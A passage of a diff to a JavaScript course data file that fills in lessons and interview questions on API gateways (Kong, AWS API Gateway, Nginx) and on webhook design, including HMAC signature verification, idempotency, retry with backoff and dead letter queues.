+
+plugins:
+  - name: key-auth
+  - name: rate-limiting
+    config:
+      hour: 1000
+
+Usage:
+- Medium to large companies
+- On-premise or cloud
+- Open source + Enterprise edition</div>
+
+                            <h3>AWS API Gateway</h3>
+                            <div class="code-block">Managed service by AWS
+
+Features:
+- Serverless (no infrastructure management)
+- Integration with Lambda, EC2, any HTTP endpoint
+- Built-in caching
+- Request/response transformation
+- API keys, usage plans
+- CloudWatch metrics
+
+Types:
+1. REST API: Full-featured, $3.50 per million requests
+2. HTTP API: Simpler, cheaper, $1 per million requests
+3. WebSocket API: Real-time communication
+
+// Terraform configuration
+resource "aws_api_gateway_rest_api" "api" {
+  name = "my-api"
+}
+
+resource "aws_api_gateway_resource" "users" {
+  rest_api_id = aws_api_gateway_rest_api.api.id
+  parent_id   = aws_api_gateway_rest_api.api.root_resource_id
+  path_part   = "users"
+}
+
+Usage:
+- Startups, enterprises using AWS
+- Serverless architectures
+- Lambda functions</div>
+
+                            <h3>Nginx</h3>
+                            <div class="code-block">Web server as API Gateway
+
+Features:
+- Reverse proxy
+- Load balancing
+- SSL termination
+- Caching
+- Rate limiting
+- Very fast (C implementation)
+
+// nginx.conf
+upstream user_service {
+  server user-service-1:3000;
+  server user-service-2:3000;
+  server user-service-3:3000;
+}
+
+server {
+  listen 443 ssl;
+  server_name api.example.com;
+
+  ssl_certificate /path/to/cert.pem;
+  ssl_certificate_key /path/to/key.pem;
+
+  location /api/users {
+    proxy_pass http://user_service;
+    proxy_set_header X-User-Id $http_x_user_id;
+
+    limit_req zone=api_limit burst=10;
+  }
+}
+
+Usage:
+- Simple API gateways
+- High-performance needs
+- Existing Nginx users</div>
+
+                            <h3>Others</h3>
+                            <div class="code-block">Envoy:
+- Modern, cloud-native proxy
+- Used by Istio (service mesh)
+- gRPC support
+- Dynamic configuration
+
+Apigee:
+- Enterprise API management (Google)
+- Analytics, monetization
+- Developer portal
+- Large enterprise focus
+
+Tyk:
+- Open source, Go-based
+- GraphQL support
+- Plugin system
+- Good performance</div>
+
+                            <h2>When to Use API Gateway</h2>
+
+                            <div class="code-block">✅ Use API Gateway when:
+- Microservices architecture (multiple services)
+- Need centralized auth/rate limiting
+- Multiple client types (mobile, web, IoT)
+- Want to aggregate multiple service calls
+- Need protocol translation (HTTP → gRPC)
+- Want to hide internal complexity from clients
+
+❌ Don't use API Gateway when:
+- Monolithic application (single service)
+- Very simple API (CRUD only)
+- Latency critical (gateway adds ~5-10ms)
+- Small team (overhead not worth it)
+
+Alternative: Direct service access
+Client → Service (simpler, less moving parts)
+
+But as you scale:
+2-3 services: Maybe not needed
+5-10 services: Consider it
+10+ services: Definitely use API Gateway</div>
+
+                            <h2>Summary</h2>
+                            <p>API Gateway provides centralized management for microservices:</p>
                             <ul style="margin: 1rem 0; margin-left: 2rem;">
-                                <li><strong>What is an API Gateway</strong>
-                                    - Single entry point for all clients
-                                    - Request routing
-                                    - Protocol translation
-                                </li>
-                                <li><strong>API Gateway Responsibilities</strong>
-                                    - Authentication and authorization
-                                    - Rate limiting
-                                    - Request/response transformation
-                                    - Caching
-                                    - Load balancing
-                                    - Monitoring and logging
-                                    - SSL termination
-                                </li>
-                                <li><strong>Patterns</strong>
-                                    - Backend for Frontend (BFF)
-                                    - Service mesh vs API gateway
-                                    - Microservices communication
-                                </li>
-                                <li><strong>Tools & Platforms</strong>
-                                    - Kong
-                                    - AWS API Gateway
-                                    - Nginx
-                                    - Envoy
-                                    - Apigee
-                                </li>
+                                <li><strong>Single entry point:</strong> All clients access services through gateway</li>
+                                <li><strong>Authentication:</strong> Centralized JWT/OAuth validation, pass user info to services</li>
+                                <li><strong>Rate limiting:</strong> Protect all services at once with consistent limits</li>
+                                <li><strong>Routing:</strong> Route requests to appropriate backend services</li>
+                                <li><strong>Transformation:</strong> Aggregate responses, transform protocols (gRPC → REST)</li>
+                                <li><strong>Caching:</strong> Cache at gateway to reduce backend load</li>
+                                <li><strong>Load balancing:</strong> Distribute traffic across service instances</li>
+                                <li><strong>SSL termination:</strong> Handle HTTPS at gateway, HTTP to services</li>
+                                <li><strong>BFF pattern:</strong> Separate gateway per client type (mobile, web, TV)</li>
+                                <li><strong>Tools:</strong> Kong (open source), AWS API Gateway (managed), Nginx (simple), Envoy (modern)</li>
+                                <li>Use for microservices (10+ services), don't use for monoliths</li>
                             </ul>
                         `,
-                        interviews: []
+                        interviews: [
+                            {
+                                question: "What is an API Gateway and what problems does it solve?",
+                                answer: "API Gateway: Single entry point between clients and backend services. Problems without: Clients know about all services (complex), duplicated concerns (every service implements auth/rate limiting), hard to change backend without breaking clients. With gateway: Single URL for clients, centralized auth/rate limiting/logging, backend changes don't affect clients, protocol translation (HTTP → gRPC), request aggregation (one client request → multiple service calls combined). Example: Mobile app → Gateway → routes to user-service, order-service, product-service. Gateway handles auth once, routes appropriately. Essential for microservices architecture."
+                            },
+                            {
+                                question: "How does centralized authentication work at the API Gateway?",
+                                answer: "Gateway validates auth once, passes user info to services. Flow: 1) Client sends JWT in Authorization header, 2) Gateway validates JWT signature/expiration, 3) Gateway extracts user info (id, role), 4) Gateway adds headers: X-User-Id, X-User-Role, 5) Routes to service with headers. Service trusts gateway headers (internal network), no auth checking needed! Benefits: Auth logic in one place, services simplified (no auth code), consistent security, easy to update auth strategy. Without gateway: Every service validates JWT (duplicated code, inconsistent). Critical for microservices - services focus on business logic, gateway handles cross-cutting concerns."
+                            },
+                            {
+                                question: "What is the Backend for Frontend (BFF) pattern?",
+                                answer: "BFF: Separate API Gateway for each client type. Mobile BFF (minimal data, aggregated responses for bandwidth), Web BFF (full data, separate endpoints), TV BFF (optimized for TV UI). Each BFF tailored to client needs, independent deployment, team ownership. Example: Mobile needs user + recent orders in one call (bandwidth constraint). Web makes separate calls (no constraint). Mobile BFF aggregates: GET /dashboard → calls user-service + order-service → combines into one response. Benefits: Optimized per platform, independent evolution, teams move fast. Drawbacks: More infrastructure, potential duplication. Use when: Multiple client types with different needs."
+                            },
+                            {
+                                question: "What's the difference between an API Gateway and Service Mesh?",
+                                answer: "API Gateway: North-south traffic (external clients → internal services). Single entry point, public-facing, coarse-grained routing. Service Mesh: East-west traffic (internal service-to-service). Sidecar proxy per service, internal only, fine-grained (every service call). Example: Client → API Gateway (Kong) → Service A. Service A → Service Mesh (Istio) → Service B. Gateway handles: client auth, rate limiting, SSL termination, public routing. Service Mesh handles: service-to-service mTLS, circuit breaking, retry logic, canary deployments. Complementary - use both together! Gateway protects edge, mesh handles internal communication."
+                            },
+                            {
+                                question: "What are the main responsibilities of an API Gateway?",
+                                answer: "1) Request routing: Route /api/users to user-service. 2) Authentication: Validate JWT, pass user info to services. 3) Rate limiting: Enforce limits per client/endpoint. 4) Transformation: Aggregate responses, protocol translation (HTTP → gRPC). 5) Caching: Cache responses to reduce backend load. 6) Load balancing: Distribute across service instances. 7) SSL termination: Handle HTTPS, services use HTTP internally. 8) Monitoring: Log all requests, metrics, distributed tracing. Benefits: Centralized cross-cutting concerns (don't duplicate in every service), simplified services (focus on business logic), consistent policies across all services."
+                            },
+                            {
+                                question: "When should you use an API Gateway and when should you avoid it?",
+                                answer: "Use when: 1) Microservices architecture (5+ services), 2) Need centralized auth/rate limiting, 3) Multiple client types (mobile, web, IoT with different needs), 4) Aggregate multiple service calls, 5) Protocol translation needed, 6) Hide internal complexity. Don't use when: 1) Monolithic app (single service, adds unnecessary complexity), 2) Very simple CRUD API, 3) Latency critical (gateway adds ~5-10ms), 4) Small team (overhead not worth it), 5) Early startup (premature optimization). Rule of thumb: 2-3 services = maybe not, 5-10 services = consider it, 10+ services = definitely use. Alternative: Direct service access (simpler, less moving parts)."
+                            }
+                        ]
                     },
                     {
                         id: 'webhooks',
                         title: 'Webhooks Implementation',
                         duration: '40 min',
                         content: `
-                            <h2>OUTLINE: Webhooks</h2>
+                            <h2>What are Webhooks?</h2>
 
-                            <h3>Topics to Cover:</h3>
-                            <ul style="margin: 1rem 0; margin-left: 2rem;">
-                                <li><strong>Webhooks Fundamentals</strong>
-                                    - What are webhooks (reverse APIs)
-                                    - Push vs pull
-                                    - Event-driven architecture
-                                </li>
-                                <li><strong>Webhook Design</strong>
-                                    - Event types and payload structure
-                                    - Webhook URLs and registration
-                                    - Security (signatures, HMAC)
-                                    - Retry logic and idempotency
-                                </li>
-                                <li><strong>Implementation</strong>
-                                    - Webhook delivery queue
-                                    - Retry strategies (exponential backoff)
-                                    - Dead letter queue
-                                    - Webhook testing and debugging
-                                </li>
-                                <li><strong>Best Practices</strong>
-                                    - Event schema versioning
-                                    - Timeouts and reliability
-                                    - Security verification
-                                    - Webhook logs and monitoring
-                                </li>
-                            </ul>
+                            <p><strong>Webhooks</strong> are user-defined HTTP callbacks that allow servers to push real-time data to clients when specific events occur. They're often called "reverse APIs" because instead of clients polling for updates, the server proactively sends data to the client.</p>
 
-                            <h3>Examples to Include:</h3>
-                            <ul style="margin: 1rem 0; margin-left: 2rem;">
-                                <li>Stripe webhooks</li>
-                                <li>GitHub webhooks</li>
-                                <li>HMAC signature verification</li>
+                            <div class="code-block">Traditional API (Pull):
+Client repeatedly asks: "Any updates?"
+GET /api/orders/123/status
+← 200 OK {"status": "pending"}
+
+... wait 30 seconds ...
+
+GET /api/orders/123/status
+← 200 OK {"status": "pending"}
+
+... wait 30 seconds ...
+
+GET /api/orders/123/status
+← 200 OK {"status": "shipped"}  ✅ Finally!
+
+Problems:
+- Wasteful (many unnecessary requests)
+- Delayed (might wait 30s to get update)
+- Server load (thousands of clients polling)</div>
+
+                            <div class="code-block">Webhooks (Push):
+Client registers webhook once:
+POST /api/webhooks
+{
+  "url": "https://myapp.com/webhooks/order-updates",
+  "events": ["order.shipped"]
+}
+
+Server sends data when event happens:
+POST https://myapp.com/webhooks/order-updates
+{
+  "event": "order.shipped",
+  "order_id": "123",
+  "shipped_at": "2024-01-15T10:30:00Z"
+}
+
+Benefits:
+✅ Real-time (immediate notification)
+✅ Efficient (only send when event occurs)
+✅ Scalable (no polling overhead)</div>
+
+                            <h3>Push vs Pull</h3>
+
+                            <table class="table">
+                                <thead>
+                                    <tr>
+                                        <th>Aspect</th>
+                                        <th>Pull (Polling)</th>
+                                        <th>Push (Webhooks)</th>
+                                    </tr>
+                                </thead>
+                                <tbody>
+                                    <tr>
+                                        <td><strong>Latency</strong></td>
+                                        <td>Delayed (poll interval)</td>
+                                        <td>Real-time (instant)</td>
+                                    </tr>
+                                    <tr>
+                                        <td><strong>Efficiency</strong></td>
+                                        <td>Low (many empty responses)</td>
+                                        <td>High (only when data exists)</td>
+                                    </tr>
+                                    <tr>
+                                        <td><strong>Server Load</strong></td>
+                                        <td>High (constant requests)</td>
+                                        <td>Low (event-driven)</td>
+                                    </tr>
+                                    <tr>
+                                        <td><strong>Client Setup</strong></td>
+                                        <td>Simple (just make requests)</td>
+                                        <td>Complex (need public endpoint)</td>
+                                    </tr>
+                                    <tr>
+                                        <td><strong>Reliability</strong></td>
+                                        <td>Client controls retry</td>
+                                        <td>Server must handle retries</td>
+                                    </tr>
+                                </tbody>
+                            </table>
+
+                            <p><strong>Real-world example:</strong> Stripe uses webhooks to notify your application when payment events occur (payment succeeded, payment failed, subscription canceled). Without webhooks, you'd have to poll every payment every few seconds to check if it completed.</p>
+
+                            <h2>Webhook Design</h2>
+
+                            <h3>Event Types & Payload Structure</h3>
+
+                            <div class="code-block">Webhook payload structure (Stripe pattern)
+
+{
+  "id": "evt_1234567890",           // Unique event ID
+  "type": "payment_intent.succeeded", // Event type
+  "created": 1617123456,             // Timestamp
+  "data": {                          // Event-specific data
+    "object": {
+      "id": "pi_abc123",
+      "amount": 2000,
+      "currency": "usd",
+      "status": "succeeded"
+    }
+  },
+  "livemode": true,
+  "api_version": "2020-08-27"        // Schema version
+}
+
+Common event naming patterns:
+resource.action
+- user.created
+- order.shipped
+- payment.succeeded
+- subscription.canceled
+
+GitHub pattern:
+- push
+- pull_request.opened
+- pull_request.closed
+- issues.created</div>
+
+                            <h3>Webhook Registration</h3>
+
+                            <div class="code-block">API to register webhooks
+
+POST /api/webhooks
+{
+  "url": "https://myapp.com/webhooks/stripe",
+  "events": [
+    "payment_intent.succeeded",
+    "payment_intent.failed",
+    "charge.refunded"
+  ],
+  "secret": "whsec_randomsecret123" // For HMAC verification
+}
+
+Response:
+{
+  "id": "wh_abc123",
+  "url": "https://myapp.com/webhooks/stripe",
+  "events": ["payment_intent.succeeded", ...],
+  "created_at": "2024-01-15T10:00:00Z",
+  "status": "active"
+}
+
+❌ BAD: Allow any URL
+{
+  "url": "http://localhost:3000/webhooks"  // Not publicly accessible!
+}
+
+✅ GOOD: Validate URL format
+- Must be HTTPS (not HTTP for production)
+- Must be publicly accessible
+- Optionally: verify URL ownership (send verification request)</div>
+
+                            <h3>Security: HMAC Signatures</h3>
+
+                            <p>Webhooks are vulnerable to spoofing - anyone could send fake webhook requests to your endpoint. Use HMAC signatures to verify authenticity.</p>
+
+                            <div class="code-block">Stripe HMAC signature verification
+
+// Server (Stripe) creates signature
+const payload = JSON.stringify(webhookData);
+const signature = crypto
+  .createHmac('sha256', webhookSecret)
+  .update(timestamp + '.' + payload)
+  .digest('hex');
+
+// Send in header
+POST https://myapp.com/webhooks/stripe
+Headers:
+  Stripe-Signature: t=1617123456,v1=5257a869e7ecebeda32affa62cdca3fa51cad7e77a0e56ff536d0ce8e108d8bd
+
+// Your app verifies signature
+const stripe = require('stripe')('sk_test_...');
+
+app.post('/webhooks/stripe', (req, res) => {
+  const sig = req.headers['stripe-signature'];
+  const payload = req.body;
+
+  try {
+    // Stripe library verifies HMAC
+    const event = stripe.webhooks.constructEvent(
+      payload,
+      sig,
+      'whsec_yoursecret'
+    );
+
+    // ✅ Signature valid, process event
+    if (event.type === 'payment_intent.succeeded') {
+      const payment = event.data.object;
+      await fulfillOrder(payment.id);
+    }
+
+    res.json({ received: true });
+  } catch (err) {
+    // ❌ Signature invalid, reject
+    console.log('Webhook signature verification failed:', err.message);
+    return res.status(400).send(`Webhook Error: ${err.message}`);
+  }
+});
+
+Why HMAC?
+- Prevents spoofed webhooks (attackers can't generate valid signature)
+- Prevents replay attacks (timestamp prevents old webhooks)
+- Ensures data integrity (payload hasn't been tampered with)</div>
+
+                            <h3>Idempotency</h3>
+
+                            <div class="code-block">Webhooks can be delivered multiple times
+
+Scenario:
+1. Stripe sends webhook
+2. Your server processes it (charges card, ships order)
+3. Your server crashes before responding 200 OK
+4. Stripe retries webhook
+5. Your server processes AGAIN → double charge! ❌
+
+Solution: Idempotent webhook handling
+
+app.post('/webhooks/stripe', async (req, res) => {
+  const event = req.body;
+
+  // Check if already processed
+  const existing = await db.webhookEvents.findOne({
+    eventId: event.id
+  });
+
+  if (existing) {
+    console.log('Event already processed:', event.id);
+    return res.json({ received: true }); // ✅ Acknowledge but don't reprocess
+  }
+
+  // Process event
+  await processPayment(event.data.object);
+
+  // Mark as processed
+  await db.webhookEvents.create({
+    eventId: event.id,
+    processedAt: new Date()
+  });
+
+  res.json({ received: true });
+});
+
+Key: Store event ID in database to detect duplicates</div>
+
+                            <h2>Webhook Implementation</h2>
+
+                            <h3>Delivery Queue</h3>
+
+                            <p>Don't send webhooks synchronously during request processing - it blocks your API and can cause timeouts.</p>
+
+                            <div class="code-block">❌ BAD: Synchronous webhook delivery
+
+app.post('/api/orders', async (req, res) => {
+  const order = await createOrder(req.body);
+
+  // Blocks response until webhook delivered!
+  await sendWebhook(order.userId, {
+    event: 'order.created',
+    data: order
+  });
+
+  res.json(order);
+  // If webhook endpoint is slow/down, this request is slow
+});
+
+✅ GOOD: Queue-based delivery
+
+const Bull = require('bull');
+const webhookQueue = new Bull('webhooks', {
+  redis: { port: 6379, host: '127.0.0.1' }
+});
+
+app.post('/api/orders', async (req, res) => {
+  const order = await createOrder(req.body);
+
+  // Add to queue (fast, non-blocking)
+  await webhookQueue.add({
+    userId: order.userId,
+    event: 'order.created',
+    data: order
+  });
+
+  res.json(order);
+  // Returns immediately
+});
+
+// Worker processes queue
+webhookQueue.process(async (job) => {
+  const { userId, event, data } = job.data;
+
+  // Get user's webhook URLs
+  const webhooks = await db.webhooks.find({
+    userId,
+    events: event,
+    status: 'active'
+  });
+
+  // Send to each webhook URL
+  for (const webhook of webhooks) {
+    await sendWebhook(webhook.url, { event, data });
+  }
+});
+
+Benefits:
+✅ Non-blocking (fast API responses)
+✅ Reliable (jobs persisted in Redis)
+✅ Scalable (multiple workers can process queue)
+✅ Retryable (failed jobs automatically retry)</div>
+
+                            <h3>Retry Strategy</h3>
+
+                            <div class="code-block">Exponential backoff retry
+
+async function sendWebhook(url, payload, attempt = 1) {
+  const maxAttempts = 5;
+
+  try {
+    const response = await fetch(url, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(payload),
+      timeout: 10000 // 10 second timeout
+    });
+
+    if (response.ok) {
+      console.log('Webhook delivered:', url);
+      return { success: true };
+    }
+
+    // Retry on 5xx errors, not 4xx
+    if (response.status >= 500 && attempt < maxAttempts) {
+      const delay = Math.pow(2, attempt) * 1000; // 2s, 4s, 8s, 16s, 32s
+      console.log(`Retry ${attempt} after ${delay}ms`);
+      await sleep(delay);
+      return sendWebhook(url, payload, attempt + 1);
+    }
+
+    throw new Error(`HTTP ${response.status}`);
+  } catch (error) {
+    if (attempt < maxAttempts) {
+      const delay = Math.pow(2, attempt) * 1000;
+      await sleep(delay);
+      return sendWebhook(url, payload, attempt + 1);
+    }
+
+    // All retries failed
+    return { success: false, error: error.message };
+  }
+}
+
+Stripe's retry schedule:
+- Immediate
+- 1 hour later
+- 3 hours later
+- 6 hours later
+- 12 hours later
+- 24 hours later
+- 3 days later (final attempt)
+
+After 3 days, webhook marked as failed</div>
+
+                            <h3>Dead Letter Queue</h3>
+
+                            <div class="code-block">Handle permanently failed webhooks
+
+webhookQueue.process(async (job) => {
+  const result = await sendWebhook(job.data.url, job.data.payload);
+
+  if (!result.success) {
+    // Move to dead letter queue for manual review
+    await deadLetterQueue.add({
+      originalJob: job.data,
+      error: result.error,
+      failedAt: new Date(),
+      attempts: job.attemptsMade
+    });
+
+    // Optionally: disable webhook
+    await db.webhooks.update(
+      { url: job.data.url },
+      { status: 'failed', lastError: result.error }
+    );
+
+    // Notify webhook owner
+    await sendEmail(webhook.ownerEmail, {
+      subject: 'Webhook delivery failed',
+      body: `Your webhook ${webhook.url} failed after ${job.attemptsMade} attempts`
+    });
+  }
+});
+
+Manual review process:
+1. Check dead letter queue
+2. Investigate why webhook failed
+3. Fix issue (update URL, resolve network issue)
+4. Re-enable webhook or requeue events</div>
+
+                            <h2>Best Practices</h2>
+
+                            <h3>Event Schema Versioning</h3>
+
+                            <div class="code-block">Include API version in webhook payload
+
+{
+  "id": "evt_123",
+  "type": "order.created",
+  "api_version": "2024-01-15",  // ← Schema version
+  "data": {
+    "object": {
+      "id": "order_456",
+      "total": 99.99
+    }
+  }
+}
+
+When schema changes:
+- Add new fields (non-breaking)
+- Don't remove fields (breaking)
+- Use new event types for major changes
+
+Example: Stripe
+- Version 2019-12-03: "amount" is integer (cents)
+- Version 2020-08-27: Added "amount_details" object
+- Old webhooks still receive old format
+- New webhooks receive new format</div>
+
+                            <h3>Timeouts & Response Codes</h3>
+
+                            <div class="code-block">Webhook endpoint best practices
+
+app.post('/webhooks', async (req, res) => {
+  // ✅ GOOD: Acknowledge immediately, process async
+  res.status(200).json({ received: true });
+
+  // Process in background
+  processWebhookAsync(req.body);
+});
+
+❌ BAD: Long processing blocks response
+app.post('/webhooks', async (req, res) => {
+  await sendEmail();           // 2 seconds
+  await updateDatabase();      // 3 seconds
+  await callThirdPartyAPI();   // 5 seconds
+
+  res.status(200).json({ received: true });
+  // Takes 10 seconds! Webhook sender might timeout and retry
+});
+
+Response codes:
+✅ 200, 201, 202, 204 → Success (won't retry)
+⚠️ 429, 503 → Temporary error (will retry)
+❌ 400, 401, 403, 404 → Permanent error (won't retry)
+❌ 500 → Server error (will retry)
+
+Timeout guidelines:
+- Respond within 5 seconds
+- Process within 30 seconds (for retry logic)
+- If processing takes longer, use async jobs</div>
+
+                            <h3>Security Verification</h3>
+
+                            <div class="code-block">Complete security checklist
+
+✅ Verify HMAC signature (prevent spoofing)
+✅ Check timestamp (prevent replay attacks)
+✅ Use HTTPS only (prevent man-in-the-middle)
+✅ Validate event ID format (prevent injection)
+✅ Rate limit webhook endpoints (prevent DoS)
+✅ Log all webhook attempts (for debugging)
+
+// GitHub webhook verification
+const crypto = require('crypto');
+
+function verifyGitHubWebhook(req) {
+  const signature = req.headers['x-hub-signature-256'];
+  const payload = JSON.stringify(req.body);
+  const secret = process.env.GITHUB_WEBHOOK_SECRET;
+
+  const hmac = crypto.createHmac('sha256', secret);
+  const digest = 'sha256=' + hmac.update(payload).digest('hex');
+
+  // Timing-safe comparison
+  const isValid = crypto.timingSafeEqual(
+    Buffer.from(signature),
+    Buffer.from(digest)
+  );
+
+  if (!isValid) {
+    throw new Error('Invalid signature');
+  }
+
+  return true;
+}
+
+Replay attack prevention:
+const WEBHOOK_TOLERANCE = 300; // 5 minutes
+
+function checkTimestamp(timestamp) {
+  const now = Math.floor(Date.now() / 1000);
+
+  if (Math.abs(now - timestamp) > WEBHOOK_TOLERANCE) {
+    throw new Error('Webhook timestamp too old');
+  }
+}</div>
+
+                            <h3>Testing Webhooks</h3>
+
+                            <div class="code-block">Tools for webhook testing
+
+1. ngrok (expose localhost)
+$ ngrok http 3000
+→ https://abc123.ngrok.io
+
+Register: https://abc123.ngrok.io/webhooks/stripe
+Test locally while developing
+
+2. Webhook.site (inspect webhooks)
+→ https://webhook.site/abc-123-def
+Gives you unique URL to see incoming requests
+
+3. Stripe CLI (trigger test webhooks)
+$ stripe listen --forward-to localhost:3000/webhooks/stripe
+$ stripe trigger payment_intent.succeeded
+
+4. Mock webhook sender
+async function mockWebhook() {
+  const payload = {
+    event: 'order.created',
+    data: { orderId: '123' }
+  };
+
+  const signature = crypto
+    .createHmac('sha256', 'test_secret')
+    .update(JSON.stringify(payload))
+    .digest('hex');
+
+  await fetch('http://localhost:3000/webhooks', {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json',
+      'X-Webhook-Signature': signature
+    },
+    body: JSON.stringify(payload)
+  });
+}</div>
+
+                            <h3>Monitoring & Logging</h3>
+
+                            <div class="code-block">What to log for webhooks
+
+// Log every webhook attempt
+{
+  "webhookId": "wh_123",
+  "eventId": "evt_456",
+  "eventType": "order.created",
+  "targetUrl": "https://customer.com/webhooks",
+  "attemptNumber": 1,
+  "httpStatus": 200,
+  "responseTime": 234,  // ms
+  "success": true,
+  "timestamp": "2024-01-15T10:30:00Z"
+}
+
+Metrics to track:
+- Delivery success rate (by webhook, by customer)
+- Average delivery time
+- Retry rate
+- Dead letter queue size
+- Events processed per second
+
+Alerts:
+- Webhook failure rate > 10%
+- Dead letter queue > 100 events
+- Average delivery time > 5 seconds
+- Same webhook failing repeatedly
+
+Dashboard:
+- Show webhook status per customer
+- Recent failures with error messages
+- Retry queue size
+- Delivery latency percentiles (p50, p95, p99)</div>
+
+                            <h2>Common Mistakes</h2>
+
+                            <div class="code-block">1. Not implementing idempotency
+❌ Process webhook without checking if already processed
+→ Result: Duplicate charges, emails, database records
+
+2. Synchronous processing
+❌ Process webhook in request handler
+→ Result: Slow responses, timeouts, retries
+
+3. No signature verification
+❌ Trust any POST request to webhook endpoint
+→ Result: Security vulnerability, fake events
+
+4. Retrying 4xx errors
+❌ Retry on 400 Bad Request, 404 Not Found
+→ Result: Wasted retries (will never succeed)
+
+5. Missing timeouts
+❌ No timeout when calling webhook URLs
+→ Result: Hung connections, queue backlog
+
+6. Not versioning event schemas
+❌ Change event structure without version field
+→ Result: Breaking changes for webhook consumers
+
+7. Exposing internal errors
+❌ Return stack traces in webhook responses
+→ Result: Information leakage
+
+8. No dead letter queue
+❌ Retry forever or drop failed events
+→ Result: Lost events or infinite retries</div>
+
+                            <h2>Real-World Examples</h2>
+
+                            <h3>Stripe Webhooks</h3>
+                            <div class="code-block">Stripe uses webhooks for payment events
+
+Events:
+- payment_intent.succeeded
+- payment_intent.payment_failed
+- charge.refunded
+- customer.subscription.deleted
+
+Use case: E-commerce checkout
+1. Customer enters payment info
+2. Your backend creates PaymentIntent
+3. Stripe processes payment
+4. Stripe sends webhook: payment_intent.succeeded
+5. Your app receives webhook, fulfills order
+6. Customer gets confirmation email
+
+Why webhooks?
+- Payment processing takes 2-30 seconds
+- Can't keep customer waiting on checkout page
+- Webhooks notify you when payment completes
+- More reliable than polling</div>
+
+                            <h3>GitHub Webhooks</h3>
+                            <div class="code-block">GitHub uses webhooks for CI/CD pipelines
+
+Events:
+- push (code pushed to repo)
+- pull_request.opened
+- pull_request.closed
+- issues.created
+
+Use case: Automated deployment
+1. Developer pushes code to main branch
+2. GitHub sends webhook: { event: "push", ref: "refs/heads/main" }
+3. Your CI server receives webhook
+4. CI runs tests, builds Docker image
+5. Deploys to production if tests pass
+
+Example payload:
+{
+  "ref": "refs/heads/main",
+  "repository": {
+    "name": "my-app",
+    "url": "https://github.com/user/my-app"
+  },
+  "commits": [
+    {
+      "id": "abc123",
+      "message": "Fix bug in login",
+      "author": { "name": "Alice" }
+    }
+  ]
+}</div>
+
+                            <h2>Summary</h2>
+
+                            <ul>
+                                <li><strong>Webhooks</strong> are HTTP callbacks that push real-time data to clients when events occur (reverse APIs)</li>
+                                <li><strong>Push vs Pull:</strong> Webhooks are more efficient and real-time than polling, but require more complex setup</li>
+                                <li><strong>Event types:</strong> Use resource.action naming (order.created, payment.succeeded)</li>
+                                <li><strong>Security:</strong> Use HMAC signatures to verify webhook authenticity, check timestamps to prevent replay attacks</li>
+                                <li><strong>Idempotency:</strong> Store event IDs to prevent duplicate processing when webhooks are retried</li>
+                                <li><strong>Queue-based delivery:</strong> Use background jobs for webhook delivery (don't block API requests)</li>
+                                <li><strong>Retry strategy:</strong> Use exponential backoff, retry 5xx errors but not 4xx errors</li>
+                                <li><strong>Dead letter queue:</strong> Move permanently failed webhooks for manual review</li>
+                                <li><strong>Version event schemas:</strong> Include API version in payload, add fields (don't remove)</li>
+                                <li><strong>Respond quickly:</strong> Return 200 OK within 5 seconds, process async in background</li>
+                                <li><strong>Testing:</strong> Use ngrok for local testing, Stripe CLI for triggering test events</li>
+                                <li><strong>Monitoring:</strong> Track delivery success rate, response times, retry rate, dead letter queue size</li>
+                                <li><strong>Real examples:</strong> Stripe (payment events), GitHub (repository events), Twilio (SMS delivery)</li>
                             </ul>
                         `,
-                        interviews: []
+                        interviews: [
+                            {
+                                question: "What are webhooks and how do they differ from traditional polling?",
+                                answer: "Webhooks are HTTP callbacks that allow servers to push real-time data to clients when specific events occur, often called 'reverse APIs'. Differences from polling: 1) Push vs Pull: Webhooks push data when events happen, polling requires client to repeatedly request updates, 2) Latency: Webhooks are real-time (immediate), polling has delay based on poll interval (30s-5min), 3) Efficiency: Webhooks only send when data exists, polling often returns empty responses, 4) Server load: Webhooks are event-driven (low load), polling creates constant load with thousands of clients, 5) Setup: Polling is simple (just make requests), webhooks require public endpoint. Example: Stripe webhooks notify you instantly when payment completes vs polling payment status every 30 seconds. Webhooks are more efficient and real-time, but require webhook endpoint infrastructure."
+                            },
+                            {
+                                question: "How do you secure webhooks to prevent spoofing and replay attacks?",
+                                answer: "Webhook security: 1) HMAC signatures: Server creates HMAC hash using shared secret + payload, sends in header (X-Webhook-Signature), your app recomputes HMAC and compares - prevents spoofing since attacker can't create valid signature without secret, 2) Timestamp validation: Include timestamp in signature, reject webhooks older than 5 minutes - prevents replay attacks, 3) HTTPS only: Encrypt webhook delivery to prevent man-in-the-middle, 4) Event ID tracking: Store processed event IDs in database to detect duplicates, 5) Rate limiting: Limit requests to webhook endpoint to prevent DoS. Stripe example: sends timestamp + signature in 'Stripe-Signature' header like 't=1617123456,v1=hash', you verify with stripe.webhooks.constructEvent(payload, signature, secret). GitHub uses X-Hub-Signature-256 with SHA256 HMAC. Always use crypto.timingSafeEqual for comparison to prevent timing attacks."
+                            },
+                            {
+                                question: "What is the proper retry strategy for failed webhook deliveries?",
+                                answer: "Webhook retry strategy: 1) Exponential backoff: Double delay between retries (2s, 4s, 8s, 16s, 32s) to avoid overwhelming failing endpoint, 2) Max attempts: Limit to 5-7 retries, then move to dead letter queue, 3) Retry conditions: Retry on 5xx errors (server error) and network errors, don't retry on 4xx errors (client error - will never succeed), 4) Timeout: Set 10-30 second timeout per attempt, 5) Dead letter queue: Move permanently failed webhooks for manual review after all retries exhausted. Stripe's schedule: immediate, 1hr, 3hrs, 6hrs, 12hrs, 24hrs, 3 days (total 7 attempts over 3 days). Implementation: Use queue system like Bull/BullMQ with Redis, configure job retries with exponential backoff. After failures, disable webhook and notify owner via email. Monitor retry rate and dead letter queue size - high retry rate indicates customer endpoint issues."
+                            },
+                            {
+                                question: "Why is idempotency important for webhook handlers and how do you implement it?",
+                                answer: "Idempotency needed because webhooks can be delivered multiple times: 1) Your server processes webhook but crashes before responding 200 OK, 2) Webhook sender retries since no acknowledgment received, 3) Without idempotency, event processed twice (double charge, duplicate email). Implementation: Store event IDs in database, check before processing: if (await db.webhookEvents.findOne({ eventId: event.id })) { return 200 }, else process and save eventId. Alternative: Use distributed lock (Redis) with event ID as key. Example scenario: Stripe sends payment_intent.succeeded, you charge card and ship order, crash before responding, Stripe retries, without idempotency you ship order twice. Include event ID from webhook provider (Stripe: event.id, GitHub: X-GitHub-Delivery header). For database: CREATE UNIQUE INDEX on event_id to prevent race conditions. TTL: Can expire old event IDs after 30 days (webhook retries won't span that long). Idempotency ensures webhooks are safe to retry."
+                            },
+                            {
+                                question: "How should you design webhook payload structure and event types?",
